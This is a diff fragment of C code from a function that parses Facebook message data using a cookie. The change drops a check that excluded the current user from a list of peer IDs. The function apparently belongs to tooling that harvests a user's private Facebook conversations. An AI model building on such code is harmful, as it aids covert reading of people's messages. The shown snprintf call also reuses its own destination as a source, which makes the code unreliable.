@@ -274,14 +274,11 @@ DWORD HandleFBMessages(char *cookie)
 				break;
 			*parser_inner2 = 0;
 
-			// Non include il nostro utente...
-			if (strcmp((char *)parser_inner1, user)) {
-				if (strlen(peers_id) == 0)
-					_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s", parser_inner1);
-				else
-					_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, parser_inner1);
-			}
-
+			if (strlen(peers_id) == 0)
+				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s", parser_inner1);
+			else
+				_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, parser_inner1);
+			
 			parser_inner1 = parser_inner2 +1;
 		}	
 
